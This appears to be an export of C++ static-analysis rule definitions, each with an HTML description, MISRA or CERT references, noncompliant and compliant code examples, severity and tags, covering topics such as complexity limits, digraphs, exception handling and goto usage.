2013-06-19T07:34:52+0200,"<p>The cyclomatic complexity of a class should not exceed a defined threshold. Complex code can perform poorly and will in any case be difficult to
understand and therefore to maintain.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",cpp:ClassComplexity,cpp,C++,"<p>The cyclomatic complexity of a class should not exceed a defined threshold. Complex code can perform poorly and will in any case be difficult to
understand and therefore to maintain.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",Classes should not be too complex,"[{'key': 'maximumClassComplexityThreshold', 'htmlDesc': 'Maximum complexity allowed.', 'defaultValue': '80', 'type': 'INTEGER'}]",CRITICAL,[],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Overloaded versions of the comma and logical conjunction operators have the semantics of function calls whose sequence point and ordering semantics
are different from those of the built- in versions. It may not be clear at the point of use that these operators are overloaded, and so developers may
be unaware which semantics apply.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include ""util.h""
class A
{
public:
  UtilType getValue ( );
  UtilType setValue ( UtilType const &amp; );
};
void f1 ( A &amp; a1, A &amp; a2 )
{
  a1.getValue ( ) &amp;&amp; a2.setValue ( 0 );	// Short circuiting may occur
}
bool operator &amp;&amp; ( UtilType const &amp;,
             UtilType const &amp; );                       // Noncompliant
void f2 ( A &amp; a1, A &amp; a2 )
{
a1.getValue ( ) &amp;&amp; a2.setValue ( 0 );     // Both operands evaluated if type returned has overloaded operator&amp;&amp;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 5-2-11 - The comma operator, &amp;&amp; operator and the || operator shall not be overloaded. </li>
</ul>",cpp:CommaAndOrOverloaded,cpp,C++,"<p>Overloaded versions of the comma and logical conjunction operators have the semantics of function calls whose sequence point and ordering semantics
are different from those of the built- in versions. It may not be clear at the point of use that these operators are overloaded, and so developers may
be unaware which semantics apply.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include ""util.h""
class A
{
public:
  UtilType getValue ( );
  UtilType setValue ( UtilType const &amp; );
};
void f1 ( A &amp; a1, A &amp; a2 )
{
  a1.getValue ( ) &amp;&amp; a2.setValue ( 0 );	// Short circuiting may occur
}
bool operator &amp;&amp; ( UtilType const &amp;,
             UtilType const &amp; );                       // Noncompliant
void f2 ( A &amp; a1, A &amp; a2 )
{
a1.getValue ( ) &amp;&amp; a2.setValue ( 0 );     // Both operands evaluated if type returned has overloaded operator&amp;&amp;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 5-2-11 - The comma operator, &amp;&amp; operator and the || operator shall not be overloaded. </li>
</ul>","The comma operator, ""&&"", and ""||"" should not be overloaded",[],CRITICAL,['misra'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Use either the <code>// ...</code> or <code>/* ... */</code> comment syntax, but be consistent and do not mix them within the same file.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* Noncompliant; both comment syntaxes are used in the same file */
// Foo
/* Bar */
</pre>
<h2>Compliant Solution</h2>
<pre>
// Compliant; uniform comment syntax
// Foo
// Bar
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/DQBWB"">CERT, MSC55-J.</a> - Use comments consistently and in a readable fashion </li>
</ul>",cpp:CommentMixedStyles,cpp,C++,"<p>Use either the <code>// ...</code> or <code>/* ... */</code> comment syntax, but be consistent and do not mix them within the same file.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* Noncompliant; both comment syntaxes are used in the same file */
// Foo
/* Bar */
</pre>
<h2>Compliant Solution</h2>
<pre>
// Compliant; uniform comment syntax
// Foo
// Bar
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/DQBWB"">CERT, MSC55-J.</a> - Use comments consistently and in a readable fashion </li>
</ul>","Comment styles ""//"" and ""/* ... */"" should not be mixed within a file",[],MINOR,"['cert', 'convention']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p><code>continue</code> is an unstructured control flow statement. It makes code less testable, less readable and less maintainable. Structured
control flow statements such as <code>if</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i;
for (i = 0; i &lt; 10; i++) {
  if (i == 5) {
    continue;  /* Noncompliant */
  }
  printf(""i = %d\n"", i);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int i;
for (i = 0; i &lt; 10; i++) {
  if (i != 5) {
    printf(""i = %d\n"", i);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.5 - The continue statement shall not be used. </li>
</ul>",cpp:ContinueUsage,cpp,C++,"<p><code>continue</code> is an unstructured control flow statement. It makes code less testable, less readable and less maintainable. Structured
control flow statements such as <code>if</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i;
for (i = 0; i &lt; 10; i++) {
  if (i == 5) {
    continue;  /* Noncompliant */
  }
  printf(""i = %d\n"", i);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int i;
for (i = 0; i &lt; 10; i++) {
  if (i != 5) {
    printf(""i = %d\n"", i);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.5 - The continue statement shall not be used. </li>
</ul>","""continue"" should not be used",[],MINOR,"['bad-practice', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The use of digraphs may not meet developer expectations.</p>
<p>The digraphs are: </p>
<ul>
  <li> <code>&lt;%</code> </li>
  <li> <code>%&gt;</code> </li>
  <li> <code>&lt;:</code> </li>
  <li> <code>:&gt;</code> </li>
  <li> <code>%:</code> </li>
  <li> <code>%:%:</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
template &lt;typename T&gt;
class A
{
  public:
    template&lt;int32_t i&gt;
    void f2();
};

void f(A&lt;int32_t&gt; * a&lt;:10:&gt;)    /* Noncompliant - usage of '&lt;:' instead of '[' and ':&gt;' instead of ']' */
&lt;%                              /* Noncompliant - usage of '&lt;%' instead of '{' */
  a&lt;:0:&gt;-&gt;f2&lt;20&gt;();             /* Noncompliant - usage of '&lt;:' and ':&gt;' */
%&gt;                              /* Noncompliant - usage of '%&gt;' instead of '}' */
</pre>
<h2>Compliant Solution</h2>
<pre>/* ... */

void f(A&lt;int32_t&gt; * a[10])      /* Compliant */
{                               /* Compliant */
  a[0]-&gt;f2&lt;20&gt;();               /* Compliant */
}                               /* Compliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-5-1 - Digraphs should not be used. </li>
</ul>",cpp:DigraphUsage,cpp,C++,"<p>The use of digraphs may not meet developer expectations.</p>
<p>The digraphs are: </p>
<ul>
  <li> <code>&lt;%</code> </li>
  <li> <code>%&gt;</code> </li>
  <li> <code>&lt;:</code> </li>
  <li> <code>:&gt;</code> </li>
  <li> <code>%:</code> </li>
  <li> <code>%:%:</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
template &lt;typename T&gt;
class A
{
  public:
    template&lt;int32_t i&gt;
    void f2();
};

void f(A&lt;int32_t&gt; * a&lt;:10:&gt;)    /* Noncompliant - usage of '&lt;:' instead of '[' and ':&gt;' instead of ']' */
&lt;%                              /* Noncompliant - usage of '&lt;%' instead of '{' */
  a&lt;:0:&gt;-&gt;f2&lt;20&gt;();             /* Noncompliant - usage of '&lt;:' and ':&gt;' */
%&gt;                              /* Noncompliant - usage of '%&gt;' instead of '}' */
</pre>
<h2>Compliant Solution</h2>
<pre>/* ... */

void f(A&lt;int32_t&gt; * a[10])      /* Compliant */
{                               /* Compliant */
  a[0]-&gt;f2&lt;20&gt;();               /* Compliant */
}                               /* Compliant */
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-5-1 - Digraphs should not be used. </li>
</ul>",Digraphs should not be used,[],BLOCKER,"['misra', 'obsolete']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The catch-all handler should come last in a chain of <code>catch</code> or <code>@catch</code> statements because it catches everything, and any
more-specific <code>catch</code>/<code>@catch</code> that comes after it will never be used, even when the relevant condition occurs. </p>
<p>This C++ code sample also applies to Objective-C.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f1()
{
  try
  {
    // ...
  }
  catch (...)
  {
    // Handle all exception types
  }
  catch (int32_t i)  // Noncompliant - handler will never be called
  {
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f1()
{
  try
  {
    // ...
  }
  catch (int32_t i)  // Compliant - int handler
  {
    // Handle int exceptions
  }
  catch (...)        // Compliant - catch-all handler
  {
    // Handle all other exception types
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-3-7 - Where multiple handlers are provided in a single try-catch statement or function-try-block, any ellipsis (catch-all)
  handler shall occur last. </li>
</ul>",cpp:EllipsisHandlerNotLast,cpp,C++,"<p>The catch-all handler should come last in a chain of <code>catch</code> or <code>@catch</code> statements because it catches everything, and any
more-specific <code>catch</code>/<code>@catch</code> that comes after it will never be used, even when the relevant condition occurs. </p>
<p>This C++ code sample also applies to Objective-C.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f1()
{
  try
  {
    // ...
  }
  catch (...)
  {
    // Handle all exception types
  }
  catch (int32_t i)  // Noncompliant - handler will never be called
  {
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f1()
{
  try
  {
    // ...
  }
  catch (int32_t i)  // Compliant - int handler
  {
    // Handle int exceptions
  }
  catch (...)        // Compliant - catch-all handler
  {
    // Handle all other exception types
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-3-7 - Where multiple handlers are provided in a single try-catch statement or function-try-block, any ellipsis (catch-all)
  handler shall occur last. </li>
</ul>","Condition-specific ""catch"" handlers should not be used after the ellipsis (catch-all) handler",[],MAJOR,"['misra', 'unused']",BUG
2013-06-19T07:34:52+0200,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo()
{
  int x;
  if (x == 42)
  {                     /* Noncompliant */
    /* do nothing */
  }
  else
  {
    printf(""x != 42"");
  }
}

void bar()
{                       /* Compliant - functions are not nested blocks */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo()
{
  int x;
  if (x != 42)
  {                     /* Compliant */
    printf(""x != 42"");
  }
}

/* ... */
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",cpp:EmptyCompoundStatement,cpp,C++,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo()
{
  int x;
  if (x == 42)
  {                     /* Noncompliant */
    /* do nothing */
  }
  else
  {
    printf(""x != 42"");
  }
}

void bar()
{                       /* Compliant - functions are not nested blocks */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo()
{
  int x;
  if (x != 42)
  {                     /* Compliant */
    printf(""x != 42"");
  }
}

/* ... */
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",Nested blocks of code should not be left empty,[],MAJOR,['suspicious'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>An empty <code>throw</code> re-throws the temporary object that represents an exception. Its use is intended to enable the handling of an exception
to be split across two or more handlers.</p>
<p>However, syntactically, there is nothing to prevent <code>throw;</code> being used outside a catch handler, where there is no exception object to
re-throw. This may lead to implementation-defined program termination.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f1(void)
{
  throw;   // Noncompliant - will call std::terminate()
}

void g1(void)
{
  try
  {
    f1();
    throw; // Noncompliant
  }
  catch (...)
  {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f1(void)
{
  try
  {
    throw(42);
  }
  catch (int32_t i) // int will be handled first here
  {
    if (i &gt; 0)
    {
      throw;        // and then re-thrown - Compliant
    }
  }
}

void g1(void)
{
  try
  {
    f1();
  }
  catch (int32_t i)
  {
    // Handle re-throw from f1()
    // after f1's handler has done what it needs
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-1-3 - An empty throw (<code>throw;</code>) shall only be used in the compound-statement of a catch handler. </li>
</ul>",cpp:EmptyThrowOutsideHandler,cpp,C++,"<p>An empty <code>throw</code> re-throws the temporary object that represents an exception. Its use is intended to enable the handling of an exception
to be split across two or more handlers.</p>
<p>However, syntactically, there is nothing to prevent <code>throw;</code> being used outside a catch handler, where there is no exception object to
re-throw. This may lead to implementation-defined program termination.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f1(void)
{
  throw;   // Noncompliant - will call std::terminate()
}

void g1(void)
{
  try
  {
    f1();
    throw; // Noncompliant
  }
  catch (...)
  {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f1(void)
{
  try
  {
    throw(42);
  }
  catch (int32_t i) // int will be handled first here
  {
    if (i &gt; 0)
    {
      throw;        // and then re-thrown - Compliant
    }
  }
}

void g1(void)
{
  try
  {
    f1();
  }
  catch (int32_t i)
  {
    // Handle re-throw from f1()
    // after f1's handler has done what it needs
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-1-3 - An empty throw (<code>throw;</code>) shall only be used in the compound-statement of a catch handler. </li>
</ul>","Empty throws (""throw;"") should only be used in the compound statements of catch handlers",[],CRITICAL,['misra'],BUG
2013-06-19T07:34:52+0200,"<p>If an enumerator list is given with no explicit initialization of members, then C/C++ allocates a sequence of integers starting at zero for the
first element and increasing by one for each subsequent element.</p>
<p>An explicit initialization of the first element, as permitted by this rule, forces the allocation of integers to start at the given value. When
adopting this approach it is essential to ensure that the initialization value used is small enough that no subsequent value in the list will exceed
the <code>int</code> storage used by enumeration constants.</p>
<p>Explicit initialization of all items in the list, which is also permissible, prevents the mixing of automatic and manual allocation, which is error
prone.</p>
<p>However, it is then the responsibility of the developer to ensure that all values are in the required range, and that values are not
unintentionally duplicated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum color { red = 3, blue, green, yellow = 5 }; // Noncompliant; both green and yellow = 5
</pre>
<h2>Compliant Solution</h2>
<pre>
enum color { red = 3, blue = 4, green = 5, yellow = 5 }; // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 9.3 - In an enumerator list, the ""="" construct shall not be used to explicitly initialize members other than the first, unless
  all items are explicitly initialized. </li>
  <li> MISRA C++:2008, 8-5-3 - In an enumerator list, the = construct shall not be used to explicitly initialize members other than the first, unless
  all items are explicitly initialized. </li>
</ul>",cpp:EnumPartialInitialization,cpp,C++,"<p>If an enumerator list is given with no explicit initialization of members, then C/C++ allocates a sequence of integers starting at zero for the
first element and increasing by one for each subsequent element.</p>
<p>An explicit initialization of the first element, as permitted by this rule, forces the allocation of integers to start at the given value. When
adopting this approach it is essential to ensure that the initialization value used is small enough that no subsequent value in the list will exceed
the <code>int</code> storage used by enumeration constants.</p>
<p>Explicit initialization of all items in the list, which is also permissible, prevents the mixing of automatic and manual allocation, which is error
prone.</p>
<p>However, it is then the responsibility of the developer to ensure that all values are in the required range, and that values are not
unintentionally duplicated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum color { red = 3, blue, green, yellow = 5 }; // Noncompliant; both green and yellow = 5
</pre>
<h2>Compliant Solution</h2>
<pre>
enum color { red = 3, blue = 4, green = 5, yellow = 5 }; // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 9.3 - In an enumerator list, the ""="" construct shall not be used to explicitly initialize members other than the first, unless
  all items are explicitly initialized. </li>
  <li> MISRA C++:2008, 8-5-3 - In an enumerator list, the = construct shall not be used to explicitly initialize members other than the first, unless
  all items are explicitly initialized. </li>
</ul>","""enum"" members other than the first one should not be explicitly initialized unless all members are explicitly initialized",[],MAJOR,['misra'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>When an exception is thrown, the call stack is unwound up to the point where the exception is to be handled. The destructors for all automatic
objects declared between the point where the exception is thrown and where it is to be handled will be invoked. If one of these destructors exits with
an exception, then the program will terminate in an implementation-defined manner, potentially yielding unexpected results. </p>
<p>Note that it is acceptable for a destructor to throw an exception that is handled within the destructor, for example within a try-catch block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class C1 {
  public: ~C1() {
    throw(42);   // Noncompliant - destructor exits with an exception
  }
};

void foo() {
  C1 c; // program terminates when c is destroyed
  throw(10);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class C1 {
  public: ~C1() {
    try {
      throw(42);   // Compliant - exception will not leave destructor
    } catch (int i) {  // int handler
      // Handle int exception throw by destructor
    }
  }
};

void foo() {
  C1 c;
  throw(10);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-5-1 - A class destructor shall not exit with an exception. </li>
</ul>",cpp:ExceptionInDestructor,cpp,C++,"<p>When an exception is thrown, the call stack is unwound up to the point where the exception is to be handled. The destructors for all automatic
objects declared between the point where the exception is thrown and where it is to be handled will be invoked. If one of these destructors exits with
an exception, then the program will terminate in an implementation-defined manner, potentially yielding unexpected results. </p>
<p>Note that it is acceptable for a destructor to throw an exception that is handled within the destructor, for example within a try-catch block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class C1 {
  public: ~C1() {
    throw(42);   // Noncompliant - destructor exits with an exception
  }
};

void foo() {
  C1 c; // program terminates when c is destroyed
  throw(10);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class C1 {
  public: ~C1() {
    try {
      throw(42);   // Compliant - exception will not leave destructor
    } catch (int i) {  // int handler
      // Handle int exception throw by destructor
    }
  }
};

void foo() {
  C1 c;
  throw(10);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-5-1 - A class destructor shall not exit with an exception. </li>
</ul>",Destructors should not throw exceptions,[],CRITICAL,['misra'],BUG
2013-06-19T07:34:52+0200,"<p>Most of the time, a very complex file breaks the Single Responsibility Principle and should be re-factored into several different files.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",cpp:FileComplexity,cpp,C++,"<p>Most of the time, a very complex file breaks the Single Responsibility Principle and should be re-factored into several different files.</p>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>",Files should not be too complex,"[{'key': 'maximumFileComplexityThreshold', 'htmlDesc': 'The maximum authorized complexity in file', 'defaultValue': '80', 'type': 'INTEGER'}]",MAJOR,[],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",cpp:FileLoc,cpp,C++,"<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>",Files should not have too many lines of code,"[{'key': 'maximumFileLocThreshold', 'htmlDesc': 'The maximum authorized lines', 'defaultValue': '1000', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>",cpp:FunctionComplexity,cpp,C++,"<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>",Functions should not be too complex,"[{'key': 'maximumFunctionComplexityThreshold', 'htmlDesc': 'The maximum authorized complexity.', 'defaultValue': '20', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Passing arguments via an ellipsis bypasses the type checking performed by the compiler. Additionally, passing an argument with non-POD class type
leads to undefined behavior. Note that the rule specifies ""defined"" (and not ""declared"") so as to permit the use of existing library functions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void MyPrintf ( char_t * pFormat, ... )	// Noncompliant
{
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.1 - Functions shall not be defined with a variable number of arguments. </li>
  <li> MISRA C++:2008, 8-4-1 - Functions shall not be defined using the ellipsis notation. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4CW"">CERT, DCL50-CPP.</a> - Do not define a C-style variadic function </li>
</ul>",cpp:FunctionEllipsis,cpp,C++,"<p>Passing arguments via an ellipsis bypasses the type checking performed by the compiler. Additionally, passing an argument with non-POD class type
leads to undefined behavior. Note that the rule specifies ""defined"" (and not ""declared"") so as to permit the use of existing library functions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void MyPrintf ( char_t * pFormat, ... )	// Noncompliant
{
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.1 - Functions shall not be defined with a variable number of arguments. </li>
  <li> MISRA C++:2008, 8-4-1 - Functions shall not be defined using the ellipsis notation. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4CW"">CERT, DCL50-CPP.</a> - Do not define a C-style variadic function </li>
</ul>",Functions should not be defined with a variable number of arguments,[],CRITICAL,"['cert', 'misra', 'pitfall']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>This is required by IEC 61508, under good programming style.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int function1()
{
  return 3;
}

void function2()
{
  function1();
}

int function3(char* ptr) /* Noncompliant; two explicit returns */
{
  if (ptr == NULL) return -1;

  return 7;
}

void function4(char *ptr) /* Noncompliant; two returns, one explicit and one implicit */
{
  if (1) return;

  printf(""hello world!\n"");
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.7 - A function shall have a single point of exit at the end of the function. </li>
  <li> MISRA C++:2008, 6-6-5 - A function shall have a single point of exit at the end of the function </li>
  <li> MISRA C:2012, 15.5 - A function should have a single point of exit at the end </li>
</ul>",cpp:FunctionSinglePointOfExit,cpp,C++,"<p>This is required by IEC 61508, under good programming style.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int function1()
{
  return 3;
}

void function2()
{
  function1();
}

int function3(char* ptr) /* Noncompliant; two explicit returns */
{
  if (ptr == NULL) return -1;

  return 7;
}

void function4(char *ptr) /* Noncompliant; two returns, one explicit and one implicit */
{
  if (1) return;

  printf(""hello world!\n"");
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.7 - A function shall have a single point of exit at the end of the function. </li>
  <li> MISRA C++:2008, 6-6-5 - A function shall have a single point of exit at the end of the function </li>
  <li> MISRA C:2012, 15.5 - A function should have a single point of exit at the end </li>
</ul>",A function should have a single point of exit at the end of the function,[],MINOR,"['brain-overload', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>A global function named <code>main</code> is the entry point to the program, and is the only identifier which must be in the global namespace. The
use of <code>main</code> for other functions may not meet developer expectations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main() {       // Compliant
}

namespace {
  int main() {     // Noncompliant
  }
}
namespace NS {
  int main() {     // Noncompliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 7-3-2 - The identifier main shall not be used for a function other than global function main. </li>
</ul>",cpp:GlobalMainFunction,cpp,C++,"<p>A global function named <code>main</code> is the entry point to the program, and is the only identifier which must be in the global namespace. The
use of <code>main</code> for other functions may not meet developer expectations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main() {       // Compliant
}

namespace {
  int main() {     // Noncompliant
  }
}
namespace NS {
  int main() {     // Noncompliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 7-3-2 - The identifier main shall not be used for a function other than global function main. </li>
</ul>","The name ""main"" should not be used for any function other than the global ""main"" function",[],BLOCKER,"['misra', 'pitfall']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Declaring names in appropriate namespaces reduces the number of names found during lookup, helping ensure that the names found meet developer
exceptions. </p>
<p>This rule has been tuned to raise an issue when a name part of the global namespace has for sure an external linkage and so exists beyond a
particular translation unit. In other words, an issue is raised when a name that is part of the global namespace is for sure accessible through the
whole program. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int      a;         // Noncompliant
int      b = 1;     // Noncompliant
MyStruct c;         // Noncompliant
MyStruct d = {1,2}; // Noncompliant

extern int      a = 1;        // Noncompliant
extern MyStruct b = {1,2};    // Noncompliant and not excluded as the structure is initialized

extern const int      a = 1;     // Noncompliant
extern const MyStruct b = {1,2}; // Noncompliant and not excluded as the structure is initialized

void            m1() { } // Noncompliant
extern void     m2() { } // Noncompliant

class A { // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace MY_API { // Compliant
  int  a;
  int  b = 1;
  extern const int c = 3;
  void m1() {
  }

  class A {
  };
}

namespace {        // Compliant
  int  b = 1;
  void m2() {
  }
}

int32_t main() {   // Compliant

}

static int            a;         // Compliant
static MyStruct       b;         // Compliant
static int            c = 1;     // Compliant
static MyStruct       d = {1,2}; // Compliant
static const int      e = 1;     // Compliant
static const MyStruct f = {1,2}; // Compliant

static void                       m1();        // Compliant
static void                       m2()     { } // Compliant
template &lt;typename T&gt; static void m3(T&amp; a) { } // Compliant

const int      a = 1;     // Compliant
const MyStruct b = {1,2}; // Compliant

extern ""C"" int       a = 1;   // Compliant
extern ""C"" const int b = 1;   // Compliant
extern ""C"" void      m1() { } // Compliant

typedef int      a; // Compliant
typedef MyStruct b; // Compliant

bool operator==(const X::Y&amp; p1, const X::Y&amp; p2) { return p1.x == p2.x; }                   // Compliant
void *operator new(size_t bytes, const X::Y&amp; context) { return X::malloc(bytes,context); } // Compliant
void operator delete(void* ptr,  const X::Y&amp; context) { X::free(bytes,context); }          // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 7-3-1 - The global namespace shall only contain main, namespace declarations and extern ""C"" declarations. </li>
</ul>",cpp:GlobalNamespaceMembers,cpp,C++,"<p>Declaring names in appropriate namespaces reduces the number of names found during lookup, helping ensure that the names found meet developer
exceptions. </p>
<p>This rule has been tuned to raise an issue when a name part of the global namespace has for sure an external linkage and so exists beyond a
particular translation unit. In other words, an issue is raised when a name that is part of the global namespace is for sure accessible through the
whole program. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int      a;         // Noncompliant
int      b = 1;     // Noncompliant
MyStruct c;         // Noncompliant
MyStruct d = {1,2}; // Noncompliant

extern int      a = 1;        // Noncompliant
extern MyStruct b = {1,2};    // Noncompliant and not excluded as the structure is initialized

extern const int      a = 1;     // Noncompliant
extern const MyStruct b = {1,2}; // Noncompliant and not excluded as the structure is initialized

void            m1() { } // Noncompliant
extern void     m2() { } // Noncompliant

class A { // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace MY_API { // Compliant
  int  a;
  int  b = 1;
  extern const int c = 3;
  void m1() {
  }

  class A {
  };
}

namespace {        // Compliant
  int  b = 1;
  void m2() {
  }
}

int32_t main() {   // Compliant

}

static int            a;         // Compliant
static MyStruct       b;         // Compliant
static int            c = 1;     // Compliant
static MyStruct       d = {1,2}; // Compliant
static const int      e = 1;     // Compliant
static const MyStruct f = {1,2}; // Compliant

static void                       m1();        // Compliant
static void                       m2()     { } // Compliant
template &lt;typename T&gt; static void m3(T&amp; a) { } // Compliant

const int      a = 1;     // Compliant
const MyStruct b = {1,2}; // Compliant

extern ""C"" int       a = 1;   // Compliant
extern ""C"" const int b = 1;   // Compliant
extern ""C"" void      m1() { } // Compliant

typedef int      a; // Compliant
typedef MyStruct b; // Compliant

bool operator==(const X::Y&amp; p1, const X::Y&amp; p2) { return p1.x == p2.x; }                   // Compliant
void *operator new(size_t bytes, const X::Y&amp; context) { return X::malloc(bytes,context); } // Compliant
void operator delete(void* ptr,  const X::Y&amp; context) { X::free(bytes,context); }          // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 7-3-1 - The global namespace shall only contain main, namespace declarations and extern ""C"" declarations. </li>
</ul>","The global namespace should only contain ""main"", namespace declarations, and ""extern"" C declarations",[],CRITICAL,"['brain-overload', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Use of <code>goto</code> can lead to programs that are extremely difficult to comprehend and analyse, and possibly to unspecified behavior.</p>
<p>Unfortunately, removing <code>goto</code> from some code can lead to a rewritten version that is even more difficult to understand than the
original. Therefore, limited use of <code>goto</code> is sometimes advised. </p>
<p>However, the use of <code>goto</code> to jump into or out of a sub-block of code, such as into the body of a <code>for</code> loop is never
acceptable, because it is extremely difficult to understand and will likely yield results other than what is intended. </p>
<h2>Noncompliant Code Example</h2>
<pre>
void f1 (int a) {
  if (a &lt;=0) {
    goto L2;  // Noncompliant; jumps into a different block
  }

  if (a == 0) {
  {
    goto L1; // Compliant
  }
  goto L2;  // Noncompliant; jumps into a block

L1:
  for (int i = 0; i &lt; a; i++) {
  L2:
    //...  Should only have come here with a &gt;=0. Loop is infinite if a &lt; 0
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f1 (int a) {
  if (a &lt;=0) {
    // ...
  }

  if (a == 0) {
  {
    goto L1; // Compliant
  }

L1:
  for (int i = 0; i &lt; a; i++) {
  L2:
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-6-1 - Any label referenced by a goto statement shall be declared in the same block, or in a block enclosing the goto
  statement </li>
  <li> MISRA C:2012, 15.3 - Any label referenced by a goto statement shall be declared in the same block, or in a block enclosing the goto statement
  </li>
</ul>",cpp:GotoLabelInNestedBlock,cpp,C++,"<p>Use of <code>goto</code> can lead to programs that are extremely difficult to comprehend and analyse, and possibly to unspecified behavior.</p>
<p>Unfortunately, removing <code>goto</code> from some code can lead to a rewritten version that is even more difficult to understand than the
